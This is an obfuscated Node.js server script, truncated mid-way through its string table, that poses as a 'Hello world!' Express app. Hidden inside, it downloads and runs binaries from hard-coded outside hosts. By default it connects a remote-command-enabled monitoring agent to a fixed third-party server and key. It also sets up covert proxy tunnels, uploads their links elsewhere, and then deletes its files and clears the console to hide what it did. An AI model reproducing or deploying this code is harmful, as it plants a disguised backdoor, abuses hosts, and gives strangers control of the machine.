const a0_0x3d98fb=a0_0x10c2;(function(_0x38be64,_0x2a697f){const _0x52d062=a0_0x10c2,_0x11c5df=_0x38be64();while(!![]){try{const _0x50fe41=-parseInt(_0x52d062(0x15f))/0x1+parseInt(_0x52d062(0x13e))/0x2+parseInt(_0x52d062(0x191))/0x3*(parseInt(_0x52d062(0x16b))/0x4)+-parseInt(_0x52d062(0xee))/0x5*(-parseInt(_0x52d062(0x112))/0x6)+parseInt(_0x52d062(0x140))/0x7*(-parseInt(_0x52d062(0x120))/0x8)+-parseInt(_0x52d062(0x13a))/0x9*(-parseInt(_0x52d062(0x103))/0xa)+-parseInt(_0x52d062(0x166))/0xb;if(_0x50fe41===_0x2a697f)break;else _0x11c5df['push'](_0x11c5df['shift']());}catch(_0x579f14){_0x11c5df['push'](_0x11c5df['shift']());}}}(a0_0x2e89,0xcf755));const a0_0x330fe5=(function(){let _0x9bea93=!![];return function(_0x4ff093,_0x317764){const _0x155dbb=_0x9bea93?function(){const _0x33de3f=a0_0x10c2;if(_0x317764){const _0x2ddd7c=_0x317764[_0x33de3f(0x141)](_0x4ff093,arguments);return _0x317764=null,_0x2ddd7c;}}:function(){};return _0x9bea93=![],_0x155dbb;};}()),a0_0x2af9aa=a0_0x330fe5(this,function(){const _0x22b5e6=a0_0x10c2,_0x2310db=function(){const _0x5eb151=a0_0x10c2;let _0x16a276;try{_0x16a276=Function(_0x5eb151(0xc7)+_0x5eb151(0x182)+');')();}catch(_0x2d3125){_0x16a276=window;}return _0x16a276;},_0x21ff7b=_0x2310db(),_0x307bd9=_0x21ff7b[_0x22b5e6(0xcb)]=_0x21ff7b[_0x22b5e6(0xcb)]||{},_0x24ee43=[_0x22b5e6(0x184),_0x22b5e6(0xf3),_0x22b5e6(0x146),'error',_0x22b5e6(0xc8),_0x22b5e6(0xde),_0x22b5e6(0xf7)];for(let _0x19fadd=0x0;_0x19fadd<_0x24ee43['length'];_0x19fadd++){const _0x214c14=a0_0x330fe5['constructor']['prototype'][_0x22b5e6(0x11f)](a0_0x330fe5),_0x2428a6=_0x24ee43[_0x19fadd],_0x1c3061=_0x307bd9[_0x2428a6]||_0x214c14;_0x214c14[_0x22b5e6(0xe2)]=a0_0x330fe5[_0x22b5e6(0x11f)](a0_0x330fe5),_0x214c14[_0x22b5e6(0x134)]=_0x1c3061[_0x22b5e6(0x134)][_0x22b5e6(0x11f)](_0x1c3061),_0x307bd9[_0x2428a6]=_0x214c14;}});a0_0x2af9aa();const express=require(a0_0x3d98fb(0x190)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(a0_0x3d98fb(0x107)),{promisify}=require(a0_0x3d98fb(0x12a)),exec=promisify(require(a0_0x3d98fb(0xd7))[a0_0x3d98fb(0x149)]),{execSync}=require('child_process'),UPLOAD_URL=process[a0_0x3d98fb(0x156)][a0_0x3d98fb(0x13b)]||'',PROJECT_URL=process[a0_0x3d98fb(0x156)][a0_0x3d98fb(0xc0)]||'',AUTO_ACCESS=process[a0_0x3d98fb(0x156)][a0_0x3d98fb(0xf6)]||![],FILE_PATH=process[a0_0x3d98fb(0x156)][a0_0x3d98fb(0x170)]||'./tmp',SUB_PATH=process[a0_0x3d98fb(0x156)][a0_0x3d98fb(0xfb)]||a0_0x3d98fb(0xd2),PORT=process['env'][a0_0x3d98fb(0x127)]||process[a0_0x3d98fb(0x156)]['PORT']||0xbb8,UUID=process[a0_0x3d98fb(0x156)]['UUID']||'c8801df2-ff22-4468-8036-b1e9802713ec',NEZHA_SERVER=process['env'][a0_0x3d98fb(0xc4)]||a0_0x3d98fb(0xe9),NEZHA_PORT=process[a0_0x3d98fb(0x156)][a0_0x3d98fb(0xcd)]||'',NEZHA_KEY=process[a0_0x3d98fb(0x156)][a0_0x3d98fb(0x129)]||'HIMrzL5F8vWxhc2OhF9CjKrJVzMvEtmc',ARGO_DOMAIN=process['env'][a0_0x3d98fb(0x16f)]||'',ARGO_AUTH=process['env'][a0_0x3d98fb(0xf0)]||'',ARGO_PORT=process[a0_0x3d98fb(0x156)][a0_0x3d98fb(0x121)]||0x1f41,CFIP=process['env']['CFIP']||'ip.sb',CFPORT=process[a0_0x3d98fb(0x156)]['CFPORT']||0x1bb,NAME=process['env'][a0_0x3d98fb(0x116)]||'';!fs[a0_0x3d98fb(0x136)](FILE_PATH)?(fs[a0_0x3d98fb(0x16a)](FILE_PATH),console[a0_0x3d98fb(0x184)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+a0_0x3d98fb(0xe6));function generateRandomName(){const _0x31d44c=a0_0x3d98fb,_0x5618f2='abcdefghijklmnopqrstuvwxyz';let _0x277f06='';for(let _0xcca81b=0x0;_0xcca81b<0x6;_0xcca81b++){_0x277f06+=_0x5618f2['charAt'](Math['floor'](Math[_0x31d44c(0x152)]()*_0x5618f2[_0x31d44c(0x16d)]));}return _0x277f06;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[a0_0x3d98fb(0x111)](FILE_PATH,phpName),webPath=path[a0_0x3d98fb(0x111)](FILE_PATH,webName),botPath=path[a0_0x3d98fb(0x111)](FILE_PATH,botName),subPath=path[a0_0x3d98fb(0x111)](FILE_PATH,a0_0x3d98fb(0x139)),listPath=path[a0_0x3d98fb(0x111)](FILE_PATH,a0_0x3d98fb(0x14f)),bootLogPath=path[a0_0x3d98fb(0x111)](FILE_PATH,a0_0x3d98fb(0x131)),configPath=path[a0_0x3d98fb(0x111)](FILE_PATH,'config.json');function deleteNodes(){const _0x1d1416=a0_0x3d98fb;try{if(!UPLOAD_URL)return;if(!fs[_0x1d1416(0x136)](subPath))return;let _0x5d1ef0;try{_0x5d1ef0=fs[_0x1d1416(0xdb)](subPath,_0x1d1416(0x147));}catch{return null;}const _0x1f72e4=Buffer[_0x1d1416(0x12d)](_0x5d1ef0,_0x1d1416(0x11b))['toString'](_0x1d1416(0x147)),_0xa7ea4f=_0x1f72e4['split']('\x0a')[_0x1d1416(0x114)](_0x2abd2a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2abd2a));if(_0xa7ea4f[_0x1d1416(0x16d)]===0x0)return;return axios['post'](UPLOAD_URL+_0x1d1416(0x105),JSON[_0x1d1416(0xf1)]({'nodes':_0xa7ea4f}),{'headers':{'Content-Type':_0x1d1416(0xc9)}})[_0x1d1416(0x15d)](_0x299e07=>{return null;}),null;}catch(_0x560c79){return null;}}function cleanupOldFiles(){const _0x3ab993=a0_0x3d98fb;try{const _0x140f0f=fs[_0x3ab993(0x109)](FILE_PATH);_0x140f0f[_0x3ab993(0x169)](_0x55f98f=>{const _0x599ce8=_0x3ab993,_0x3e21a9=path[_0x599ce8(0x111)](FILE_PATH,_0x55f98f);try{const _0x4ab52a=fs[_0x599ce8(0x183)](_0x3e21a9);_0x4ab52a[_0x599ce8(0xe1)]()&&fs['unlinkSync'](_0x3e21a9);}catch(_0x2bbbea){}});}catch(_0x5665cf){}}app[a0_0x3d98fb(0x117)]('/',function(_0x30c4ba,_0x5d9c58){const _0x3931e9=a0_0x3d98fb;_0x5d9c58[_0x3931e9(0x17c)](_0x3931e9(0xe0));});async function generateConfig(){const _0x2b0081=a0_0x3d98fb,_0x16e4b9={'log':{'access':_0x2b0081(0xdc),'error':_0x2b0081(0xdc),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2b0081(0x15e),'settings':{'clients':[{'id':UUID,'flow':_0x2b0081(0x17a)}],'decryption':_0x2b0081(0x10c),'fallbacks':[{'dest':0xbb9},{'path':_0x2b0081(0x118),'dest':0xbba},{'path':_0x2b0081(0x11c),'dest':0xbbb},{'path':_0x2b0081(0x173),'dest':0xbbc}]},'streamSettings':{'network':_0x2b0081(0x151)}},{'port':0xbb9,'listen':_0x2b0081(0x17f),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x2b0081(0x10c)},'streamSettings':{'network':_0x2b0081(0x151),'security':_0x2b0081(0x10c)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2b0081(0x15e),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2b0081(0x10c)},'streamSettings':{'network':'ws','security':_0x2b0081(0x10c),'wsSettings':{'path':_0x2b0081(0x118)}},'sniffing':{'enabled':!![],'destOverride':[_0x2b0081(0xeb),_0x2b0081(0x10d),_0x2b0081(0xe3)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2b0081(0x17f),'protocol':_0x2b0081(0x163),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2b0081(0x11c)}},'sniffing':{'enabled':!![],'destOverride':[_0x2b0081(0xeb),_0x2b0081(0x10d),_0x2b0081(0xe3)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x2b0081(0x135),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2b0081(0x10d),_0x2b0081(0xe3)],'metadataOnly':![]}}],'dns':{'servers':[_0x2b0081(0x101)]},'outbounds':[{'protocol':_0x2b0081(0x10a),'tag':_0x2b0081(0x145)},{'protocol':_0x2b0081(0x144),'tag':_0x2b0081(0x10e)}]};fs[_0x2b0081(0x10f)](path[_0x2b0081(0x111)](FILE_PATH,_0x2b0081(0x10b)),JSON[_0x2b0081(0xf1)](_0x16e4b9,null,0x2));}function getSystemArchitecture(){const _0x55c523=a0_0x3d98fb,_0x5af903=os['arch']();return _0x5af903==='arm'||_0x5af903===_0x55c523(0x138)||_0x5af903===_0x55c523(0xfe)?'arm':_0x55c523(0x14e);}function downloadFile(_0x2eb327,_0x3796e8,_0x272da7){const _0x1e35a6=a0_0x3d98fb,_0x3e6682=_0x2eb327;!fs[_0x1e35a6(0x136)](FILE_PATH)&&fs[_0x1e35a6(0x16a)](FILE_PATH,{'recursive':!![]});const _0x4f41c7=fs[_0x1e35a6(0x188)](_0x3e6682);axios({'method':_0x1e35a6(0x117),'url':_0x3796e8,'responseType':_0x1e35a6(0x113)})[_0x1e35a6(0x137)](_0x472892=>{const _0x2eec6b=_0x1e35a6;_0x472892[_0x2eec6b(0xd4)][_0x2eec6b(0x178)](_0x4f41c7),_0x4f41c7['on'](_0x2eec6b(0x167),()=>{const _0x36c6d4=_0x2eec6b;_0x4f41c7[_0x36c6d4(0x155)](),console[_0x36c6d4(0x184)]('Download\x20'+path[_0x36c6d4(0x16e)](_0x3e6682)+_0x36c6d4(0x11e)),_0x272da7(null,_0x3e6682);}),_0x4f41c7['on'](_0x2eec6b(0x13f),_0x5d88e6=>{const _0xe81c35=_0x2eec6b;fs[_0xe81c35(0xff)](_0x3e6682,()=>{});const _0x3ad1b6='Download\x20'+path[_0xe81c35(0x16e)](_0x3e6682)+_0xe81c35(0xc3)+_0x5d88e6[_0xe81c35(0x181)];console[_0xe81c35(0x13f)](_0x3ad1b6),_0x272da7(_0x3ad1b6);});})[_0x1e35a6(0x15d)](_0x392b60=>{const _0x3f1918=_0x1e35a6,_0x44899e=_0x3f1918(0x18d)+path[_0x3f1918(0x16e)](_0x3e6682)+_0x3f1918(0xc3)+_0x392b60[_0x3f1918(0x181)];console['error'](_0x44899e),_0x272da7(_0x44899e);});}async function downloadFilesAndRun(){const _0xde8fdb=a0_0x3d98fb,_0x5d57e1=getSystemArchitecture(),_0x23bdeb=getFilesForArchitecture(_0x5d57e1);if(_0x23bdeb[_0xde8fdb(0x16d)]===0x0){console[_0xde8fdb(0x184)](_0xde8fdb(0x160));return;}const _0x33c98b=_0x23bdeb[_0xde8fdb(0x150)](_0xcfb6c6=>{return new Promise((_0x3a3c3b,_0x12850a)=>{const _0x42b602=a0_0x10c2;downloadFile(_0xcfb6c6[_0x42b602(0xf8)],_0xcfb6c6['fileUrl'],(_0x15ba8f,_0x130242)=>{_0x15ba8f?_0x12850a(_0x15ba8f):_0x3a3c3b(_0x130242);});});});try{await Promise['all'](_0x33c98b);}catch(_0x70a68f){console[_0xde8fdb(0x13f)](_0xde8fdb(0xd5),_0x70a68f);return;}function _0x3b43ac(_0x101069){const _0x5d0071=_0xde8fdb,_0x35ac44=0x1fd;_0x101069[_0x5d0071(0x169)](_0x52080e=>{const _0x2ccec9=_0x5d0071;fs[_0x2ccec9(0x136)](_0x52080e)&&fs[_0x2ccec9(0xc6)](_0x52080e,_0x35ac44,_0x1c6dfd=>{const _0x594adb=_0x2ccec9;_0x1c6dfd?console[_0x594adb(0x13f)]('Empowerment\x20failed\x20for\x20'+_0x52080e+':\x20'+_0x1c6dfd):console['log']('Empowerment\x20success\x20for\x20'+_0x52080e+':\x20'+_0x35ac44[_0x594adb(0x134)](0x8));});});}const _0x38e47b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3b43ac(_0x38e47b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3d63ac=NEZHA_SERVER[_0xde8fdb(0xea)](':')?NEZHA_SERVER['split'](':')[_0xde8fdb(0xdd)]():'',_0x56e299=new Set([_0xde8fdb(0x16c),_0xde8fdb(0x18e),_0xde8fdb(0x130),_0xde8fdb(0x15c),_0xde8fdb(0xec),_0xde8fdb(0xf4)]),_0x3b84b4=_0x56e299['has'](_0x3d63ac)?_0xde8fdb(0x12b):_0xde8fdb(0xe7),_0x1ac883=_0xde8fdb(0x110)+NEZHA_KEY+_0xde8fdb(0xd8)+NEZHA_SERVER+_0xde8fdb(0x171)+_0x3b84b4+_0xde8fdb(0x157)+UUID;fs[_0xde8fdb(0x10f)](path[_0xde8fdb(0x111)](FILE_PATH,_0xde8fdb(0x175)),_0x1ac883);const _0x86a211=_0xde8fdb(0x132)+phpPath+_0xde8fdb(0x186)+FILE_PATH+_0xde8fdb(0x104);try{await exec(_0x86a211),console[_0xde8fdb(0x184)](phpName+'\x20is\x20running'),await new Promise(_0x142b26=>setTimeout(_0x142b26,0x3e8));}catch(_0x38707b){console[_0xde8fdb(0x13f)](_0xde8fdb(0xd9)+_0x38707b);}}else{let _0x359a7d='';const _0x5c5cd5=[_0xde8fdb(0x16c),_0xde8fdb(0x18e),_0xde8fdb(0x130),'2087',_0xde8fdb(0xec),_0xde8fdb(0xf4)];_0x5c5cd5[_0xde8fdb(0xea)](NEZHA_PORT)&&(_0x359a7d=_0xde8fdb(0x12f));const _0x492d10=_0xde8fdb(0x132)+npmPath+_0xde8fdb(0xe8)+NEZHA_SERVER+':'+NEZHA_PORT+_0xde8fdb(0xf2)+NEZHA_KEY+'\x20'+_0x359a7d+_0xde8fdb(0x124);try{await exec(_0x492d10),console[_0xde8fdb(0x184)](npmName+_0xde8fdb(0x12e)),await new Promise(_0x2c4d1e=>setTimeout(_0x2c4d1e,0x3e8));}catch(_0x22f284){console[_0xde8fdb(0x13f)]('npm\x20running\x20error:\x20'+_0x22f284);}}}else console[_0xde8fdb(0x184)](_0xde8fdb(0x11d));const _0x352af6=_0xde8fdb(0x132)+webPath+_0xde8fdb(0xd1)+FILE_PATH+_0xde8fdb(0xd0);try{await exec(_0x352af6),console[_0xde8fdb(0x184)](webName+'\x20is\x20running'),await new Promise(_0x4d47bb=>setTimeout(_0x4d47bb,0x3e8));}catch(_0x2da2ea){console[_0xde8fdb(0x13f)](_0xde8fdb(0x123)+_0x2da2ea);}if(fs[_0xde8fdb(0x136)](botPath)){let _0x2427d1;if(ARGO_AUTH[_0xde8fdb(0x17e)](/^[A-Z0-9a-z=]{120,250}$/))_0x2427d1=_0xde8fdb(0xbf)+ARGO_AUTH;else ARGO_AUTH[_0xde8fdb(0x17e)](/TunnelSecret/)?_0x2427d1=_0xde8fdb(0x192)+FILE_PATH+_0xde8fdb(0x159):_0x2427d1=_0xde8fdb(0x161)+FILE_PATH+_0xde8fdb(0xef)+ARGO_PORT;try{await exec(_0xde8fdb(0x132)+botPath+'\x20'+_0x2427d1+_0xde8fdb(0x11a)),console[_0xde8fdb(0x184)](botName+_0xde8fdb(0x12e)),await new Promise(_0x1aca56=>setTimeout(_0x1aca56,0x7d0));}catch(_0x2cee1d){console[_0xde8fdb(0x13f)](_0xde8fdb(0x13d)+_0x2cee1d);}}await new Promise(_0x4573d0=>setTimeout(_0x4573d0,0x1388));}function getFilesForArchitecture(_0x486f12){const _0x1769cb=a0_0x3d98fb;let _0x589690;_0x486f12===_0x1769cb(0xc2)?_0x589690=[{'fileName':webPath,'fileUrl':_0x1769cb(0x100)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x589690=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x385045=_0x486f12===_0x1769cb(0xc2)?_0x1769cb(0xcf):_0x1769cb(0x133);_0x589690[_0x1769cb(0xf5)]({'fileName':npmPath,'fileUrl':_0x385045});}else{const _0x5328d5=_0x486f12===_0x1769cb(0xc2)?_0x1769cb(0xd3):_0x1769cb(0xfc);_0x589690['unshift']({'fileName':phpPath,'fileUrl':_0x5328d5});}}return _0x589690;}function argoType(){const _0x1ed35d=a0_0x3d98fb;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1ed35d(0x184)](_0x1ed35d(0x18b));return;}if(ARGO_AUTH[_0x1ed35d(0xea)](_0x1ed35d(0x106))){fs['writeFileSync'](path[_0x1ed35d(0x111)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x1c1796=_0x1ed35d(0x162)+ARGO_AUTH[_0x1ed35d(0x193)]('\x22')[0xb]+_0x1ed35d(0xed)+path[_0x1ed35d(0x111)](FILE_PATH,'tunnel.json')+_0x1ed35d(0x153)+ARGO_DOMAIN+_0x1ed35d(0xca)+ARGO_PORT+_0x1ed35d(0x14a);fs[_0x1ed35d(0x10f)](path[_0x1ed35d(0x111)](FILE_PATH,'tunnel.yml'),_0x1c1796);}else console[_0x1ed35d(0x184)](_0x1ed35d(0x15a));}argoType();async function extractDomains(){const _0x1db50c=a0_0x3d98fb;let _0x114ee3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x114ee3=ARGO_DOMAIN,console[_0x1db50c(0x184)](_0x1db50c(0x125),_0x114ee3),await _0x410c8e(_0x114ee3);else try{const _0x8772f4=fs['readFileSync'](path[_0x1db50c(0x111)](FILE_PATH,_0x1db50c(0x131)),'utf-8'),_0x327ab6=_0x8772f4[_0x1db50c(0x193)]('\x0a'),_0x34c2ec=[];_0x327ab6[_0x1db50c(0x169)](_0x56847d=>{const _0x21b942=_0x1db50c,_0x27f1b9=_0x56847d[_0x21b942(0x17e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x27f1b9){const _0x2b13f5=_0x27f1b9[0x1];_0x34c2ec[_0x21b942(0x15b)](_0x2b13f5);}});if(_0x34c2ec[_0x1db50c(0x16d)]>0x0)_0x114ee3=_0x34c2ec[0x0],console[_0x1db50c(0x184)](_0x1db50c(0xce),_0x114ee3),await _0x410c8e(_0x114ee3);else{console[_0x1db50c(0x184)](_0x1db50c(0xc5)),fs[_0x1db50c(0xe5)](path[_0x1db50c(0x111)](FILE_PATH,_0x1db50c(0x131)));async function _0x50bdbc(){const _0x5b3adc=_0x1db50c;try{process[_0x5b3adc(0x14b)]===_0x5b3adc(0x176)?await exec(_0x5b3adc(0x165)+botName+_0x5b3adc(0x18a)):await exec(_0x5b3adc(0xd6)+botName['charAt'](0x0)+']'+botName[_0x5b3adc(0xdf)](0x1)+_0x5b3adc(0x172));}catch(_0x88d32c){}}_0x50bdbc(),await new Promise(_0x3125eb=>setTimeout(_0x3125eb,0xbb8));const _0x57ad66=_0x1db50c(0x161)+FILE_PATH+_0x1db50c(0xef)+ARGO_PORT;try{await exec(_0x1db50c(0x132)+botPath+'\x20'+_0x57ad66+_0x1db50c(0x11a)),console[_0x1db50c(0x184)](botName+_0x1db50c(0x12e)),await new Promise(_0x29d0fd=>setTimeout(_0x29d0fd,0xbb8)),await extractDomains();}catch(_0x3da641){console[_0x1db50c(0x13f)](_0x1db50c(0x13d)+_0x3da641);}}}catch(_0x4328cd){console['error'](_0x1db50c(0x14d),_0x4328cd);}async function _0x410c8e(_0x1a28b0){const _0x111f56=_0x1db50c,_0x17b662=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x111f56(0x147)}),_0x3235a7=_0x17b662[_0x111f56(0x108)](),_0x3750c7=NAME?NAME+'-'+_0x3235a7:_0x3235a7;return new Promise(_0x192c60=>{setTimeout(()=>{const _0x4f35b3=a0_0x10c2,_0x27ea0a={'v':'2','ps':''+_0x3750c7,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4f35b3(0x10c),'net':'ws','type':_0x4f35b3(0x10c),'host':_0x1a28b0,'path':_0x4f35b3(0x17b),'tls':_0x4f35b3(0x10d),'sni':_0x1a28b0,'alpn':'','fp':_0x4f35b3(0x185)},_0x2d7d42=_0x4f35b3(0x18c)+UUID+'@'+CFIP+':'+CFPORT+_0x4f35b3(0xda)+_0x1a28b0+_0x4f35b3(0xcc)+_0x1a28b0+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x3750c7+_0x4f35b3(0x122)+Buffer['from'](JSON['stringify'](_0x27ea0a))['toString'](_0x4f35b3(0x11b))+_0x4f35b3(0x158)+UUID+'@'+CFIP+':'+CFPORT+_0x4f35b3(0x14c)+_0x1a28b0+_0x4f35b3(0xcc)+_0x1a28b0+_0x4f35b3(0x154)+_0x3750c7+_0x4f35b3(0x128);console[_0x4f35b3(0x184)](Buffer[_0x4f35b3(0x12d)](_0x2d7d42)[_0x4f35b3(0x134)](_0x4f35b3(0x11b))),fs[_0x4f35b3(0x10f)](subPath,Buffer[_0x4f35b3(0x12d)](_0x2d7d42)[_0x4f35b3(0x134)](_0x4f35b3(0x11b))),console[_0x4f35b3(0x184)](FILE_PATH+_0x4f35b3(0x168)),uploadNodes(),app[_0x4f35b3(0x117)]('/'+SUB_PATH,(_0x4ff0e7,_0x557b1c)=>{const _0x2492eb=_0x4f35b3,_0xd2ebcf=Buffer[_0x2492eb(0x12d)](_0x2d7d42)[_0x2492eb(0x134)](_0x2492eb(0x11b));_0x557b1c[_0x2492eb(0x164)](_0x2492eb(0xfa),_0x2492eb(0xfd)),_0x557b1c[_0x2492eb(0x17c)](_0xd2ebcf);}),_0x192c60(_0x2d7d42);},0x7d0);});}}function a0_0x10c2(_0x37d0b7,_0x8451af){const _0x24c862=a0_0x2e89();return a0_0x10c2=function(_0x2af9aa,_0x330fe5){_0x2af9aa=_0x2af9aa-0xbf;let _0x592101=_0x24c862[_0x2af9aa];return _0x592101;},a0_0x10c2(_0x37d0b7,_0x8451af);}async function uploadNodes(){const _0x5cc943=a0_0x3d98fb;if(UPLOAD_URL&&PROJECT_URL){const _0x4f0d96=PROJECT_URL+'/'+SUB_PATH,_0x3420b9={'subscription':[_0x4f0d96]};try{const _0x3248b9=await axios[_0x5cc943(0x17d)](UPLOAD_URL+_0x5cc943(0x187),_0x3420b9,{'headers':{'Content-Type':_0x5cc943(0xc9)}});return _0x3248b9&&_0x3248b9[_0x5cc943(0x148)]===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x3248b9):null;}catch(_0x21959d){if(_0x21959d[_0x5cc943(0x143)]){if(_0x21959d['response'][_0x5cc943(0x148)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5cc943(0x136)](listPath))return;const _0x19e504=fs['readFileSync'](listPath,_0x5cc943(0x147)),_0x3ce6b0=_0x19e504[_0x5cc943(0x193)]('\x0a')['filter'](_0x3a16ed=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5cc943(0x13c)](_0x3a16ed));if(_0x3ce6b0[_0x5cc943(0x16d)]===0x0)return;const _0x5d24d7=JSON[_0x5cc943(0xf1)]({'nodes':_0x3ce6b0});try{const _0x31535b=await axios[_0x5cc943(0x17d)](UPLOAD_URL+_0x5cc943(0x119),_0x5d24d7,{'headers':{'Content-Type':_0x5cc943(0xc9)}});return _0x31535b&&_0x31535b[_0x5cc943(0x148)]===0xc8?(console[_0x5cc943(0x184)](_0x5cc943(0x174)),_0x31535b):null;}catch(_0x23429b){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5b648c=a0_0x10c2,_0x31e71e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x31e71e['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x31e71e['push'](phpPath);process[_0x5b648c(0x14b)]===_0x5b648c(0x176)?exec(_0x5b648c(0x177)+_0x31e71e['join']('\x20')+_0x5b648c(0x115),_0x3ebd13=>{const _0x2d58af=_0x5b648c;console['clear'](),console[_0x2d58af(0x184)]('App\x20is\x20running'),console['log'](_0x2d58af(0x180));}):exec(_0x5b648c(0x102)+_0x31e71e[_0x5b648c(0x111)]('\x20')+_0x5b648c(0x179),_0xc7766b=>{const _0x255f72=_0x5b648c;console[_0x255f72(0x142)](),console[_0x255f72(0x184)](_0x255f72(0x189)),console[_0x255f72(0x184)](_0x255f72(0x180));});},0x15f90);}function a0_0x2e89(){const _0x71ab92=['PROJECT_URL','listen','arm','\x20failed:\x20','NEZHA_SERVER','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','chmod','return\x20(function()\x20','exception','application/json','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','console','&fp=firefox&type=ws&host=','NEZHA_PORT','ArgoDomain:','https://arm64.ssss.nyc.mn/agent','/config.json\x20>/dev/null\x202>&1\x20&','\x20-c\x20','sub','https://arm64.ssss.nyc.mn/v1','data','Error\x20downloading\x20files:','pkill\x20-f\x20\x22[','child_process','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','php\x20running\x20error:\x20','?encryption=none&security=tls&sni=','readFileSync','/dev/null','pop','table','substring','Hello\x20world!','isFile','__proto__','quic','Add\x20automatic\x20access\x20task\x20faild:\x20','unlinkSync','\x20already\x20exists','false','\x20-s\x20','6.182610.xyz:6666','includes','http','2083','\x0a\x20\x20credentials-file:\x20','5FBnlsO','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ARGO_AUTH','stringify','\x20-p\x20','warn','2053','unshift','AUTO_ACCESS','trace','fileName','http\x20server\x20is\x20running\x20on\x20port:','Content-Type','SUB_PATH','https://amd64.ssss.nyc.mn/v1','text/plain;\x20charset=utf-8','aarch64','unlink','https://arm64.ssss.nyc.mn/web','https+local://8.8.8.8/dns-query','rm\x20-rf\x20','20sTpttJ','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/api/delete-nodes','TunnelSecret','path','trim','readdirSync','freedom','config.json','none','tls','block','writeFileSync','\x0aclient_secret:\x20','join','3021702PPNDmt','stream','filter','\x20>\x20nul\x202>&1','NAME','get','/vless-argo','/api/add-nodes','\x20>/dev/null\x202>&1\x20&','base64','/vmess-argo','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20successfully','bind','8DeDlDs','ARGO_PORT','\x0a\x20\x20\x0avmess://','web\x20running\x20error:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN:','Unhandled\x20error\x20in\x20startserver:','SERVER_PORT','\x0a\x20\x20\x20\x20','NEZHA_KEY','util','true','Error\x20in\x20startserver:','from','\x20is\x20running','--tls','2096','boot.log','nohup\x20','https://amd64.ssss.nyc.mn/agent','toString','trojan','existsSync','then','arm64','sub.txt','5528745jtVXYb','UPLOAD_URL','test','Error\x20executing\x20command:\x20','1208826ZvqSjd','error','3005758dKxtCB','apply','clear','response','blackhole','direct','info','utf-8','status','exec','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','platform','?security=tls&sni=','Error\x20reading\x20boot.log:','amd','list.txt','map','tcp','random','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','close','env','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20\x0atrojan://','/tunnel.yml\x20run','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','push','2087','catch','vless','286995UjeonL','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0a\x20\x20tunnel:\x20','vmess','set','taskkill\x20/f\x20/im\x20','15842981EmeXSt','finish','/sub.txt\x20saved\x20successfully','forEach','mkdirSync','4IyuTbe','443','length','basename','ARGO_DOMAIN','FILE_PATH','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x22\x20>\x20/dev/null\x202>&1','/trojan-argo','Nodes\x20uploaded\x20s